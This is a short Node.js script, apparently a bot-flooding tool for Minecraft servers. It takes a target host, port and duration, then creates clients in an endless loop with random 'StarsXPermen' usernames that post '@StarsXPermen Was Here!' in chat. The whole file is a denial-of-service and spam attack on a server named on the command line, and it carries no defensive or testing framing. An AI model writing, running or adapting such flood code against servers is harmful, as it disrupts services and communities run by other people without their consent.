const mc = require('minecraft-protocol');
const { merge } = require('lodash');

const duration = process.argv[4];
const server = {
    host: process.argv[2],
    port: process.argv[3],
};

const bots = [];

function createBot() {
    const bot = mc.createClient(merge({}, server, { username: 'StarsXPermen' + Math.floor(Math.random() * 100000) }));

    bot.on('login', () => {
        // console.log('Client login:', bot.username);
        bot.chat('@StarsXPermen Was Here!');
    });

    bot.on('kick_disconnect', () => {
        // console.log('Client disconnected:', bot.username);
    });

    bot.on('end', () => {
        // console.log('Client end:', bot.username);
    });

    bot.on('error', (err) => {
        console.log('Client error:', bot.username, err);
    });

    bot.end();
}

setTimeout(() => process.exit(1), duration * 1000);
for (let i = 0; i < Infinity; i++) {
    createBot();
}
